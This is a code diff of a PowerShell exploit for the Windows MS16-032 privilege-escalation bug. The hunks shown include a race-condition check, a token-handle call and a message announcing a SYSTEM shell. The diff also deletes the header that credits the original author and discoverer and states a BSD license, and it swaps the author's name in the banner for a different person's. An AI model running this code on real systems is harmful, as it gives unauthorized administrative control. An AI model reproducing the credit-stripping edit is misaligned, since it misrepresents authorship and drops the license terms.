@@ -1,33 +1,4 @@
 function Invoke-MS16-032 {
-<#
-.SYNOPSIS
-    
-    PowerShell implementation of MS16-032. The exploit targets all vulnerable
-    operating systems that support PowerShell v2+. Credit for the discovery of
-    the bug and the logic to exploit it go to James Forshaw (@tiraniddo).
-    
-    Targets:
-    
-    * Win7-Win10 & 2k8-2k12 <== 32/64 bit!
-    * Tested on x32 Win7, x64 Win8, x64 2k12R2
-    
-    Notes:
-    
-    * In order for the race condition to succeed the machine must have 2+ CPU
-      cores. If testing in a VM just make sure to add a core if needed mkay.
-    * Want to know more about MS16-032 ==>
-      https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html
-
-.DESCRIPTION
-	Author: Ruben Boonen (@FuzzySec)
-	Blog: http://www.fuzzysecurity.com/
-	License: BSD 3-Clause
-	Required Dependencies: PowerShell v2+
-	Optional Dependencies: None
-    
-.EXAMPLE
-	C:\PS> Invoke-MS16-032
-#>
 	Add-Type -TypeDefinition @"
 	using System;
 	using System.Diagnostics;
@@ -262,7 +233,7 @@ function Invoke-MS16-032 {
 	|     |_  |_| |_| . |___| | |_  |  _|
 	|_|_|_|___|_____|___|   |___|___|___|
 	                                    
-	               [by b33f -> @FuzzySec]
+	               [by Jens Lindström ]
 "@
 	
 	$ms16032
@@ -270,7 +241,7 @@ function Invoke-MS16-032 {
 	# Check logical processor count, race condition requires 2+
 	echo "`n[?] Operating system core count: $([System.Environment]::ProcessorCount)"
 	if ($([System.Environment]::ProcessorCount) -lt 2) {
-		echo "[!] This is a VM isn't it, race condition requires at least 2 CPU cores, exiting!`n"
+		echo "[!] Race condition requires at least 2 CPU cores, exiting!`n"
 		Return
 	}
 	
@@ -350,7 +321,7 @@ function Invoke-MS16-032 {
 		$CallResult = [Advapi32]::OpenProcessToken($ProcessInfo.hProcess, 0x28, [ref]$hTokenHandle)
 		# If we can't open the process token it's a SYSTEM shell!
 		if (!$CallResult) {
-			echo "[!] Holy handle leak Batman, we have a SYSTEM shell!!`n"
+			echo "[!] Holy Handle Leak Potato, we have a SYSTEM shell !!!!!!`n"
 			$CallResult = [Kernel32]::ResumeThread($ProcessInfo.hThread)
 			$StartTokenRace.Stop()
 			$SafeGuard.Stop()
